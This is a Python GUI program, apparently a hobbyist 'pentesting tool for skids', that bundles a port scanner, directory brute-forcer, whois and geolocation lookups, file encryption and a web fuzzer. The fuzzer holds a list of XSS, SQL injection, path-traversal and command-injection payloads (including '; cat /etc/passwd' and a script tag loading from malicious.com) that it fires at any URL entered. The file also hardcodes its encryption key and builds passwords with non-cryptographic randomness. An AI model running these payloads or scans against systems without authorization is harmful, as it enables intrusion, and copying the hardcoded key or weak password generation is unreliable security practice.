import customtkinter as ctk
import platform,socket, threading,requests
from tkinter import messagebox
import subprocess
import whois
from cryptography.fernet import Fernet
import hashlib
import random
import urllib


session = requests.Session()

stop_scan = False

def set_true():
    global stop_scan
    stop_scan = True



KEY = 'S4Qi9utdKx8xS6IhM-s-BzaVW5clhVXCQ1xY64OCs_I='

# ============================
# Network seite Tools
# ============================

# Port scanner

def thread_port_scan():
    global stop_scan
    stop_scan = False

    thread = threading.Thread(target=port_scanner,daemon=True)
    thread.start()


def port_scanner():
    port_scan_outputbox.delete(1.0,ctk.END)
    target = port_scan_entry.get()

    if target == '':
        messagebox.showerror('Error', "Input box can't be empty")
        return

    for port in range(1025):
        

        if stop_scan:
            port_scan_outputbox.insert(ctk.END, f"Stopped by user. Save Output")
            return

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)

            res = s.connect_ex((target, port))

            if res == 0:
                port_scan_outputbox.insert(ctk.END, f"Port {port} --> Open\n")
            else:
                port_scan_outputbox.insert(ctk.END, f"Port {port} --> Closed\n")
        except socket.gaierror:
            port_scan_outputbox.insert(ctk.END, f"Error Domain or Ip may not exist\n ")
        finally:
            s.close()

        port_scan_outputbox.see(ctk.END)
        port_scan_outputbox.update_idletasks()


# ping tester

def ping_thread():
    thread = threading.Thread(target=pinger, daemon=True)
    thread.start()


def pinger():
    ping_test_outputbox.delete(1.0,ctk.END)
    target = ping_test_entry.get()

    

    if target == '':
        messagebox.showerror('Error', "Input box can't be empty")
        return
    
    try:
        ping_test_outputbox.insert(ctk.END, "Testing...\n\n")
        res = subprocess.run(['ping', target],capture_output=True, text=True,timeout=10)
        

        

        if res.returncode == 0:
            ping_test_outputbox.insert(ctk.END, "Target reachable")
        else:
            ping_test_outputbox.insert(ctk.END, "Target not reachable")

    except Exception as e:
        ping_test_outputbox.insert(ctk.END, f"Error {e}")


# dns lookup

def dns_lookup():
    dns_lookup_outputbox.delete(1.0,ctk.END)
    target = dns_lookup_entry.get()

    if target == '':
        messagebox.showerror('Error', "Input box can't be empty")
        return
    
    
    try:
        ip_address = socket.gethostbyname(target)

        dns_lookup_outputbox.insert(ctk.END, f"Target IP: {ip_address}")

    except Exception as e:
        dns_lookup_outputbox.insert(ctk.END, f"Error: {e}")



# reverse dns lookup

def rev_dns_Lookup():
    target = reverse_dns_lookup_entry.get().strip()
    reverse_dns_lookup_outputbox.delete(1.0,ctk.END)

    if not target:
        messagebox.showerror('error', "The input field cannot be emplty")

    try:
        res = socket.gethostbyaddr(target)

        reverse_dns_lookup_outputbox.insert(ctk.END, f'Hostname: {res[0]}\nAliases: {res[1]}\nIP list: {res[2]}')
    except Exception as e:
        reverse_dns_lookup_outputbox.insert(ctk.END, f'Error: {e}')
    


# who is lookup

def whois_lookup():
    target = who_is_entry.get()
    who_is_outputbox.delete(1.0,ctk.END)

    if target == '':
        messagebox.showerror('error', "The input field cannot be emplty")
        return

    try:
        w = whois.whois(target)
        who_is_outputbox.insert(ctk.END, f'{w}')
    except Exception as e:
        who_is_outputbox.insert(ctk.END, f'Error: {e}')

# dirb

def dirb_threading():
    global stop_scan
    stop_scan = False

    messagebox.showinfo('Info','This tool will use the default list for dirb the developer created.')

    thread = threading.Thread(target=dirb,daemon=True)
    thread.start()

def dirb():
    
    target = dirb_discovery_ent.get().strip()
    dirb_outputbox.delete(1.0,ctk.END)


    if not target:
        messagebox.showerror('error', "The input field cannot be emplty")

    try:
        with open("dirb.txt", 'r') as reading:
            words = reading.read().splitlines()

        for word in words:
            
            full_url = f'{target}/{word}'

            if stop_scan:
                dirb_outputbox.insert(ctk.END, f'Stopped by user. Save the output!')
                return

            try:
                data = session.get(full_url, timeout=3)
            except requests.exceptions.RequestException:
                continue

            if data.status_code == 200:
                dirb_outputbox.insert(ctk.END, f'[+] 200 Might exist --> {full_url}\n')
            elif data.status_code == 301 or data.status_code == 302:
                dirb_outputbox.insert(ctk.END, f'[+] {data.status_code} Redirect --> {full_url}\n')
            elif data.status_code == 403:
                dirb_outputbox.insert(ctk.END, f'[+] 403 Forbidden --> {full_url}\n')
            elif data.status_code == 404:
                dirb_outputbox.insert(ctk.END, f'[-]404 Not Found --> {full_url}\n')
            else:
                pass
            
            dirb_outputbox.see(ctk.END)
            dirb_outputbox.update_idletasks()

            
    except Exception as e:
        dirb_outputbox.insert(ctk.END, f'Error: {e}')

# ==========================================
# IP TOOLS
#===========================================

# Ip geoloca
def ip_geo():
    target = ip_geo_ent.get().strip()
    ip_geo_outputbox.delete(1.0,ctk.END)

    if not target:
        messagebox.showerror('error', "The input field cannot be emplty")
        return

    try:
        r = requests.get(f"http://ip-api.com/json/{target}", timeout=3)
        ip_geo_outputbox.insert(ctk.END, f'[+] Ip Geolocation:\n{r.json()}')
    except Exception as e:
        ip_geo_outputbox.insert(ctk.END, f'Error Getting location: {e}')


# own public IP

def thread_myip():
    thread = threading.Thread(target=myip,daemon=True)
    thread.start()

def myip():
    own_ip_outputbox.delete(1.0,ctk.END)
    try:
        own_ip_outputbox.insert(ctk.END, f'Getting Public Ip...\n\n')
        ip = requests.get('https://api.ipify.org').text


        own_ip_outputbox.insert(ctk.END, f'Your Ip: {ip}')
    except Exception as e:
        own_ip_outputbox.insert(ctk.END, f'Error: {e}')



# ==============================
# Cryptography Tools
# ==============================

# File encryption and decryption
def enc_file():
    enc_dec_outputbox.delete(1.0,ctk.END)
    file = file_enc_dec_ent.get()

    if file == '':
        messagebox.showerror('error', "The input field cannot be emplty")
        return

    f = Fernet(KEY)

    try:
        with open(file, 'rb') as file_data:
            data = file_data.read()

        enc_data = f.encrypt(data)

        with open(file, 'wb') as file_data:
            data = file_data.write(enc_data)

        enc_dec_outputbox.insert(ctk.END, f'File: {file} Encrypted successfully!')
    except Exception as e:
        enc_dec_outputbox.insert(ctk.END, f'Error: {e}')


def dec_file(): 
    enc_dec_outputbox.delete(1.0,ctk.END)
    file = file_enc_dec_ent.get()

    if file == '':
        messagebox.showerror('error', "The input field cannot be emplty")
        return

    f = Fernet(KEY)

    try:
        with open(file, 'rb') as file_data:
            data = file_data.read()

        dec_data = f.decrypt(data)

        with open(file, 'wb') as file_data:
            data = file_data.write(dec_data)

        enc_dec_outputbox.insert(ctk.END, f'File: {file} Decrypted successfully!')
    except Exception as e:
        enc_dec_outputbox.insert(ctk.END, f'Error: {e}')


# hashing (sha256,md5,sha1 etc)

def hash_it():
    hash_outputbox.delete(1.0,ctk.END)
    text = text_to_hash_ent.get()


    if text == '':
        messagebox.showerror('error', "The input field cannot be emplty")
        return
    try:
        md5 = hashlib.md5(text.encode()).hexdigest()
        sha256 = hashlib.sha256(text.encode()).hexdigest()
        sha1 = hashlib.sha1(text.encode()).hexdigest()
        sha512 = hashlib.sha512(text.encode()).hexdigest()
        sha384 = hashlib.sha384(text.encode()).hexdigest()
        
        
        hash_outputbox.insert(ctk.END, f"MD5: {md5}\n\nSHA256: {sha256}\n\nSHA1: {sha1}\n\nSHA512: {sha512}\n\nSHA382: {sha384}")
    except Exception as e:
        hash_outputbox.insert(ctk.END, f"Error: {e}")

# Password generator

def generatepass():
    password_outputbox.delete(1.0,ctk.END)
    chars = '1234567890QWERTZUIOPÜASDFGHJKLÖÄYXCVBNM;:-_!"§$%&/()=?ß+*~#@"<>|€'

    passwd = ''.join(random.choice(chars) for i in range(20))

    password_outputbox.insert(ctk.END, f"Generated password: {passwd}")



# ======================================
# Web security Tools
# ======================================

def thread_fuzzer():
    global stop_scan
    stop_scan = False
    thread = threading.Thread(target=fuzzer,daemon=True)
    thread.start()


def fuzzer():
    target = fuzz_ent.get()
    
    if not target:
        messagebox.showinfo('Info', 'Please enter a target!')
        return
    
    fuzzing_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "' OR 1=1 --",
        "' UNION SELECT null, null, null, null --",
        "<svg/onload=alert('XSS')>",
        "' OR 'a'='a",
        "; DROP TABLE users;",
        "<body onload=alert('XSS')>",
        "' or 1=1;--",
        "../../../../etc/passwd",
        "../../../bin/bash",
        "..\\..\\..\\..\\..\\windows\\system32\\config",
        "<script src='http://malicious.com/malicious.js'></script>",
        "<svg onload=alert(1)>",
        "; ls",
        "; id",
        "; whoami",
        "; cat /etc/passwd",
    ]
    
    search_parameters = ['q', 'search', 's', 'query', 'id', 'page', 'user', 'input']
    
    fuzzing_outputbox.insert(ctk.END, f'Testing target: {target}\n')
    fuzzing_outputbox.insert(ctk.END, f'Loading {len(fuzzing_payloads)} payloads across {len(search_parameters)} parameters...\n\n')
    
    vulnerabilities_found = []
    total_tests = 0
    
    for payload in fuzzing_payloads:
        if stop_scan:
            fuzzing_outputbox.insert(ctk.END, f'\nScan stopped by user.\n')
            break
        
        encoded = urllib.parse.quote(payload)
        
        for param in search_parameters:
            if stop_scan:
                break
                
            total_tests += 1
            url = f'{target}?{param}={encoded}'
            
            try:
                resp = requests.get(url, timeout=3)
                
                if encoded in resp.text:
                    result_msg = f'[!] Possible vulnerability found with payload: {payload[:50]}... -> {url}\n'
                    fuzzing_outputbox.insert(ctk.END, result_msg)
                    vulnerabilities_found.append({
                        'payload': payload,
                        'url': url,
                        'parameter': param
                    })
                
                if resp.status_code >= 500:
                    fuzzing_outputbox.insert(ctk.END, f'[!] Server Error 500: {url}\n')
                    
            except requests.exceptions.Timeout:
                fuzzing_outputbox.insert(ctk.END, f'[Timeout] {url}\n')
            except requests.exceptions.ConnectionError:
                fuzzing_outputbox.insert(ctk.END, f'[Connection Error] {url}\n')
            except requests.exceptions.RequestException:
                fuzzing_outputbox.insert(ctk.END, f'[Request Failed] {url}\n')
    
    # Summary at the end
    fuzzing_outputbox.insert(ctk.END, f'\n--- SCAN SUMMARY ---\n')
    fuzzing_outputbox.insert(ctk.END, f'Total tests performed: {total_tests}\n')
    fuzzing_outputbox.insert(ctk.END, f'Total vulnerabilities found: {len(vulnerabilities_found)}\n')
    
    if vulnerabilities_found:
        fuzzing_outputbox.insert(ctk.END, f'[ALERT] Vulnerabilities were found!\n')
        fuzzing_outputbox.insert(ctk.END, f'Details:\n')
        for vuln in vulnerabilities_found:
            fuzzing_outputbox.insert(ctk.END, f'  - {vuln["payload"][:50]}... (parameter: {vuln["parameter"]})\n')
    else:
        fuzzing_outputbox.insert(ctk.END, f'[OK] No vulnerabilities were found.\n')
    
    fuzzing_outputbox.insert(ctk.END, f'Scan completed.\n')


# ==================================
# Main Window
# ==================================

def main():
    global port_scan_entry, port_scan_frame, port_scan_outputbox, port_scan_start_btn, port_scan_stop_btn
    global ping_test_entry, ping_test_frame, ping_test_start, ping_test_outputbox
    global dns_lookup_entry, dns_lookup_frame, dns_lookup_outputbox, dns_lookup_start_btn
    global reverse_dns_lookup_entry, reverse_dns_lookup_frame, reverse_dns_lookup_outputbox, reverse_dns_lookup_start_btn
    global who_is_entry, who_is_lookup, who_is_outputbox, who_is_start_btn
    global dirb_discovery_ent, dirb_discovery_frame, dirb_discovery_start_btn, dirb_discovery_stop_btn, dirb_outputbox
    global ip_geo_ent,ip_geo_outputbox,ip_geo_start_btn, ip_geo_frame
    global own_ip_frame,own_ip_outputbox,get_own_ip_start
    global file_enc_dec_frame,file_enc_dec_ent,enc_btn,dec_btn,enc_dec_outputbox
    global hash_outputbox,hash_btn,text_to_hash_ent,hashing_frame
    global password_outputbox
    global fuzzing_frame,fuzz_ent,fuzz_start_btn,fuzz_stop_btn,fuzzing_outputbox
    ctk.set_default_color_theme('blue')

    app = ctk.CTk()
    app.geometry('1200x800')
    app.resizable(False,False)
    app.title('Skids Toolkit RealVersion')
    
    # ====================================================
    # Main Frame (Contains the Sidebar and Main Area)
    # ====================================================

    main_frame = ctk.CTkFrame(app)
    main_frame.pack(fill='both',expand=True)


    


    # ================================================
    # Main Area and its Frames
    # ================================================

    main_area = ctk.CTkFrame(main_frame)
    main_area.pack(side='right', fill='both', expand=True)



    
    # ==============
    # Main seite
    # ==============

    info = {
        "Host": socket.gethostbyname(socket.gethostname()),
        "User": socket.gethostname(),
        "OS": platform.system(),
        "Python": platform.python_version(),
    }

    main_seite = ctk.CTkFrame(main_area)
    title_fram_in_main_site = ctk.CTkFrame(main_seite, width=500,height=100)
    title_fram_in_main_site.pack_propagate(False)
    title_fram_in_main_site.pack(pady=20)
    
    ctk.CTkLabel(title_fram_in_main_site, text="🛡️Welcome to GlexGC", font=('Arial', 32, 'bold'),bg_color='transparent').pack(pady=30)
    ctk.CTkLabel(main_seite, text="This is a easy made pentesting Tool for skids.\n\n We have:\n Network Tools,\nIp Tools,\nCryptography Tools\nand Web security Tools", font=('Arial', 18,),bg_color='transparent',text_color='lightblue').pack(pady=50,padx=100)
    
    system_info_frame = ctk.CTkFrame(main_seite, width=400, height=280)
    system_info_frame.place(relx=0.3,rely=0.5)  # Feste Position und Größe
    

    system_info_title = ctk.CTkLabel(system_info_frame, text='System Info', text_color='lightblue',font=('Arial',18))
    system_info_title.place(x=30,y=20)

    y = 80


    for key, val in info.items():

        key_lbl = ctk.CTkLabel(
            system_info_frame,
            text=f"{key}:",
            text_color="lightgreen"
        )
        key_lbl.place(x=30, y=y)

        val_lbl = ctk.CTkLabel(
            system_info_frame,
            text=str(val)
        )
        val_lbl.place(x=200, y=y)

        y += 35

    
    #======================
    # Network seite and title
    # =====================


    network_seite = ctk.CTkFrame(main_area)

    ctk.CTkLabel(network_seite, text="NETWORK TOOLS", font=('Arial', 28, 'bold')).pack(pady=20)

    # scroll frame
    network_scroll = ctk.CTkScrollableFrame(network_seite)
    network_scroll.pack(fill='both', expand=True, padx=20, pady=20)
    
    

    # Port scan frame and components

    port_scan_frame =ctk.CTkFrame(network_scroll,height=300)
    port_scan_frame.pack_propagate(False)
    port_scan_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(port_scan_frame, text="Port scan", font=('Arial', 18, 'bold')).pack(pady=20)

    port_scan_entry = ctk.CTkEntry(port_scan_frame,width=200,placeholder_text='Enter Ip or Domain')
    port_scan_entry.place(x=100,y=100)

    port_scan_start_btn = ctk.CTkButton(port_scan_frame,text='Start Port scan',command=thread_port_scan)
    port_scan_start_btn.place(x=100,y=150)

    port_scan_stop_btn = ctk.CTkButton(port_scan_frame,text='Stop Port scan',command=set_true)
    port_scan_stop_btn.place(x=100,y=200)

    port_scan_outputbox = ctk.CTkTextbox(port_scan_frame,width=500,font=('Arial',18))
    port_scan_outputbox.place(x=400,y=70)

    # Ping Test

    ping_test_frame =ctk.CTkFrame(network_scroll,height=300)
    ping_test_frame.pack_propagate(False)
    ping_test_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(ping_test_frame, text="Ping Test", font=('Arial', 18, 'bold')).pack(pady=20)

    ping_test_entry = ctk.CTkEntry(ping_test_frame,width=200,placeholder_text='Enter Ip or Domain')
    ping_test_entry.place(x=100,y=100)

    ping_test_start = ctk.CTkButton(ping_test_frame,text='Start Ping Test',command=ping_thread)
    ping_test_start.place(x=100,y=150)

    ping_test_outputbox = ctk.CTkTextbox(ping_test_frame,width=500,font=('Arial',18))
    ping_test_outputbox.place(x=400,y=70)

    # dns lookup

    dns_lookup_frame = ctk.CTkFrame(network_scroll,height=300)
    dns_lookup_frame.pack_propagate(False)
    dns_lookup_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(dns_lookup_frame, text="Dns Lookup ", font=('Arial', 18, 'bold')).pack(pady=20)

    dns_lookup_entry = ctk.CTkEntry(dns_lookup_frame,width=200,placeholder_text='Enter Domain')
    dns_lookup_entry.place(x=100,y=100)

    dns_lookup_start_btn = ctk.CTkButton(dns_lookup_frame,text='Start DNS Lookup',command=dns_lookup)
    dns_lookup_start_btn.place(x=100,y=150)

    dns_lookup_outputbox = ctk.CTkTextbox(dns_lookup_frame,width=500,font=('Arial',18))
    dns_lookup_outputbox.place(x=400,y=70)


    # reverse dns lookup

    reverse_dns_lookup_frame = ctk.CTkFrame(network_scroll,height=300)
    reverse_dns_lookup_frame.pack_propagate(False)
    reverse_dns_lookup_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(reverse_dns_lookup_frame, text="Reverse Dns Lookup ", font=('Arial', 18, 'bold')).pack(pady=20)

    reverse_dns_lookup_entry = ctk.CTkEntry(reverse_dns_lookup_frame,width=200,placeholder_text='Enter IP')
    reverse_dns_lookup_entry.place(x=100,y=100)

    reverse_dns_lookup_start_btn = ctk.CTkButton(reverse_dns_lookup_frame,text='Start revesre DNS Lookup',command=rev_dns_Lookup)
    reverse_dns_lookup_start_btn.place(x=100,y=150)

    reverse_dns_lookup_outputbox = ctk.CTkTextbox(reverse_dns_lookup_frame,width=500,font=('Arial',18))
    reverse_dns_lookup_outputbox.place(x=400,y=70)

    # Who is Lookup

    who_is_lookup = ctk.CTkFrame(network_scroll,height=300)
    who_is_lookup.pack_propagate(False)
    who_is_lookup.pack(pady=20,fill='x')

    ctk.CTkLabel(who_is_lookup, text="Who is Lookup ", font=('Arial', 18, 'bold')).pack(pady=20)

    who_is_entry = ctk.CTkEntry(who_is_lookup,width=200,placeholder_text='Enter IP')
    who_is_entry.place(x=100,y=100)

    who_is_start_btn = ctk.CTkButton(who_is_lookup,text='Start Who is Lookup',command=whois_lookup)
    who_is_start_btn.place(x=100,y=150)

    who_is_outputbox = ctk.CTkTextbox(who_is_lookup,width=500,font=('Arial',18))
    who_is_outputbox.place(x=400,y=70)

    # Dirb

    dirb_discovery_frame = ctk.CTkFrame(network_scroll,height=300)
    dirb_discovery_frame.pack_propagate(False)
    dirb_discovery_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(dirb_discovery_frame, text="Dirb Discovery ", font=('Arial', 18, 'bold')).pack(pady=20)

    dirb_discovery_ent = ctk.CTkEntry(dirb_discovery_frame,width=200,placeholder_text='Enter url')
    dirb_discovery_ent.place(x=100,y=100)

    dirb_discovery_start_btn = ctk.CTkButton(dirb_discovery_frame,text='Start Dirb',command=dirb_threading)
    dirb_discovery_start_btn.place(x=100,y=150)

    dirb_discovery_stop_btn = ctk.CTkButton(dirb_discovery_frame,text='Stop dirb scan',command=set_true)
    dirb_discovery_stop_btn.place(x=100,y=200)

    dirb_outputbox = ctk.CTkTextbox(dirb_discovery_frame,width=500,font=('Arial',18))
    dirb_outputbox.place(x=400,y=70)




    # ======================================
    # Ip Tools Seite
    # ======================================    

    ip_seite = ctk.CTkFrame(main_area)
    ctk.CTkLabel(ip_seite, text="IP TOOLS", font=('Arial', 28, 'bold')).pack(pady=50)

    # ip tools scroll able
    ip_tools_scroll = ctk.CTkScrollableFrame(ip_seite)
    ip_tools_scroll.pack(fill='both', expand=True, padx=20, pady=20)


    # ip geolocate


    ip_geo_frame = ctk.CTkFrame(ip_tools_scroll,height=300)
    ip_geo_frame.pack_propagate(False)
    ip_geo_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(ip_geo_frame, text="Ip Geolocate ", font=('Arial', 18, 'bold')).pack(pady=20)



    ip_geo_ent = ctk.CTkEntry(ip_geo_frame,width=200,placeholder_text='Enter ip')
    ip_geo_ent.place(x=100,y=100)

    ip_geo_start_btn = ctk.CTkButton(ip_geo_frame,text='Get geolocation',command=ip_geo)
    ip_geo_start_btn.place(x=100,y=150)

    ip_geo_outputbox = ctk.CTkTextbox(ip_geo_frame,width=500,font=('Arial',18))
    ip_geo_outputbox.place(x=400,y=70)


    # own public IP

    own_ip_frame = ctk.CTkFrame(ip_tools_scroll,height=300)
    own_ip_frame.pack_propagate(False)
    own_ip_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(own_ip_frame, text="Your public IP ", font=('Arial', 18, 'bold')).pack(pady=20)

    get_own_ip_start = ctk.CTkButton(own_ip_frame,text='Get your Public IP',command=thread_myip)
    get_own_ip_start.place(x=100,y=150)

    own_ip_outputbox = ctk.CTkTextbox(own_ip_frame,width=500,font=('Arial',18))
    own_ip_outputbox.place(x=400,y=70)



    # ======================================
    # Cryptography Tools
    # ======================================
    crypto_seite = ctk.CTkFrame(main_area)
    ctk.CTkLabel(crypto_seite, text="CRYPTOGRAPHY TOOLS", font=('Arial', 28, 'bold')).pack(pady=50)


    # scroll frame cryptography 
    crypt_tools_scroll = ctk.CTkScrollableFrame(crypto_seite)
    crypt_tools_scroll.pack(fill='both', expand=True, padx=20, pady=20)

 

    # file enc and dec

    file_enc_dec_frame = ctk.CTkFrame(crypt_tools_scroll,height=300)
    file_enc_dec_frame.pack_propagate(False)
    file_enc_dec_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(file_enc_dec_frame, text="File encryption/decryption ", font=('Arial', 18, 'bold')).pack(pady=20)

    file_enc_dec_ent = ctk.CTkEntry(file_enc_dec_frame,width=270,placeholder_text='Enter FULL path to the file you want to encrypt')
    file_enc_dec_ent.place(x=100,y=100)

    enc_btn = ctk.CTkButton(file_enc_dec_frame,text='Encrypt file',command=enc_file)
    enc_btn.place(x=100,y=150)

    dec_btn = ctk.CTkButton(file_enc_dec_frame,text='Decrypt file',command=dec_file)
    dec_btn.place(x=100,y=200)

    enc_dec_outputbox = ctk.CTkTextbox(file_enc_dec_frame,width=500,font=('Arial',18))
    enc_dec_outputbox.place(x=400,y=70)

    

    # hashing sha256,md5

    hashing_frame = ctk.CTkFrame(crypt_tools_scroll,height=300)
    hashing_frame.pack_propagate(False)
    hashing_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(hashing_frame, text="Text Hashing (SHA256, SHA1, SHA512, MD5, SHA384) ", font=('Arial', 18, 'bold')).pack(pady=20)

    text_to_hash_ent = ctk.CTkEntry(hashing_frame,width=270,placeholder_text='Enter Text to hash')
    text_to_hash_ent.place(x=100,y=100)

    hash_btn = ctk.CTkButton(hashing_frame,text='Hash text',command=hash_it)
    hash_btn.place(x=100,y=150)

    hash_outputbox = ctk.CTkTextbox(hashing_frame,width=500,font=('Arial',18))
    hash_outputbox.place(x=400,y=70)


    # password generator

    pass_gen_frame = ctk.CTkFrame(crypt_tools_scroll,height=300)
    pass_gen_frame.pack_propagate(False)
    pass_gen_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(pass_gen_frame, text="Password generator", font=('Arial', 18, 'bold')).pack(pady=20)

    pass_gen_btn = ctk.CTkButton(pass_gen_frame,text='Generate Password',command=generatepass)
    pass_gen_btn.place(x=100,y=150)

    password_outputbox = ctk.CTkTextbox(pass_gen_frame,width=500,font=('Arial',18))
    password_outputbox.place(x=400,y=70)



    # =====================================
    # Web Security
    # =====================================




    web_seite = ctk.CTkFrame(main_area)
    ctk.CTkLabel(web_seite, text="WEB SECURITY", font=('Arial', 28, 'bold')).pack(pady=50)

    # Scroll frame web sec
    scroll_frame_web_sec = ctk.CTkScrollableFrame(web_seite)
    scroll_frame_web_sec.pack(fill='both', expand=True, padx=20, pady=20)

    # fuzzing

    fuzzing_frame = ctk.CTkFrame(scroll_frame_web_sec,height=300)
    fuzzing_frame.pack_propagate(False)
    fuzzing_frame.pack(pady=20,fill='x')

    ctk.CTkLabel(fuzzing_frame, text="Fuzzing", font=('Arial', 28, 'bold')).pack(pady=20)

    fuzz_ent = ctk.CTkEntry(fuzzing_frame,width=270,placeholder_text='Enter target url')
    fuzz_ent.place(x=100,y=100)

    fuzz_start_btn = ctk.CTkButton(fuzzing_frame,text='Start Fuzzing',command=thread_fuzzer)
    fuzz_start_btn.place(x=100,y=150)

    fuzz_stop_btn = ctk.CTkButton(fuzzing_frame,text='Stop Fuzzing',command=set_true)
    fuzz_stop_btn.place(x=100,y=200)

    fuzzing_outputbox = ctk.CTkTextbox(fuzzing_frame,width=500,font=('Arial',18))
    fuzzing_outputbox.place(x=400,y=70)


    # ==========================
    # INFO Seite
    # ==========================

    info_seite = ctk.CTkFrame(main_area)
    ctk.CTkLabel(info_seite, text="INFO", font=('Arial', 28, 'bold')).pack(pady=50)

    ctk.CTkLabel(info_seite, text="This Tool is made for skid who cant code or read Code.\nIf you are a Real Developer using this Tool then you DONT have the permission to upgrade the Tool.\n\n⚠️ The Developer who created This main Version is NOT responsible for any misuse made with this Tool.\nUsing at your own Risk⚠️\n\nSupported OS: Windows 11\n\nRequired libaries:\n   requests - pip install requests\n   customtkinter - pip install customtkinter\n   python-whois - pip install python-whois\n   cryptography - pip install cryptography\n\n\n\n Made by Glitch\nVersion 1.0  ", font=('Arial', 18,),text_color='lightblue').pack(pady=100)
 

    # =====================================
    # Functions to show the tools
    # =====================================

    def show_main():
        main_seite.pack(fill='both', expand=True)
        network_seite.pack_forget()
        ip_seite.pack_forget()
        crypto_seite.pack_forget()
        web_seite.pack_forget()
        info_seite.pack_forget()

    def show_network():
        network_seite.pack(fill='both', expand=True)
        main_seite.pack_forget()
        ip_seite.pack_forget()
        crypto_seite.pack_forget()
        web_seite.pack_forget()
        info_seite.pack_forget()
    
    def show_ip():
        ip_seite.pack(fill='both', expand=True)
        main_seite.pack_forget()
        network_seite.pack_forget()
        crypto_seite.pack_forget()
        web_seite.pack_forget()
        info_seite.pack_forget()

    def show_cryp():
        crypto_seite.pack(fill='both', expand=True)
        main_seite.pack_forget()
        network_seite.pack_forget()
        ip_seite.pack_forget()
        web_seite.pack_forget()
        info_seite.pack_forget()

    def show_web():
        web_seite.pack(fill='both', expand=True)
        main_seite.pack_forget()
        network_seite.pack_forget()
        ip_seite.pack_forget()
        crypto_seite.pack_forget()
        info_seite.pack_forget()


    def show_info():
        info_seite.pack(fill='both', expand=True)
        main_seite.pack_forget()
        network_seite.pack_forget()
        ip_seite.pack_forget()
        crypto_seite.pack_forget()
        web_seite.pack_forget()



    # ====================================================
    # Sidebar components
    # ====================================================

    sidebar = ctk.CTkFrame(main_frame,width=200,border_width=2,border_color='lightblue')
    sidebar.pack(fill='y', side='left')
    sidebar.pack_propagate(False) 

    sidebar_title = ctk.CTkLabel(sidebar,text='Tools',font=('Arial',24,'bold'))
    sidebar_title.pack(pady=50)

    main_btn = ctk.CTkButton(sidebar,text='📦Main',font=('Arial',16),command=show_main, fg_color='transparent', border_width=2,border_color='black')
    main_btn.pack(pady=30)

    network_btn = ctk.CTkButton(sidebar,text='🛜Network Tools',font=('Arial',16),command=show_network, fg_color='transparent', border_width=2,border_color='black')
    network_btn.pack(pady=15)

    ip_tools_btn = ctk.CTkButton(sidebar,text='📍IP Tools',font=('Arial',16),command=show_ip, fg_color='transparent', border_width=2,border_color='black')
    ip_tools_btn.pack(pady=15)

    cryp_tools_btn = ctk.CTkButton(sidebar,text='🔐Cryptography Tools',font=('Arial',16),command=show_cryp, fg_color='transparent', border_width=2,border_color='black')
    cryp_tools_btn.pack(pady=15)

    web_sec_btn = ctk.CTkButton(sidebar,text='🌐Web Security',font=('Arial',16),command=show_web, fg_color='transparent', border_width=2,border_color='black')
    web_sec_btn.pack(pady=15)

    info_btn = ctk.CTkButton(sidebar,text='📜Info',font=('Arial',16),command=show_info, fg_color='transparent', border_width=2,border_color='black')
    info_btn.pack(pady=15)

    ctk.CTkLabel(sidebar,text='Made By Glitch\nVersion 1.0\n\nThere is no group\nbehind this Tool.\n1 person only.\n\n⚠️Use it responsibly⚠️\nMisuse = Jail\n\nNo one is allowed\nto upgrade This Tool\nwothout asking the\nReal Developer').pack(pady=40)
    


    show_main()

    app.mainloop()


if __name__ == '__main__':
    main()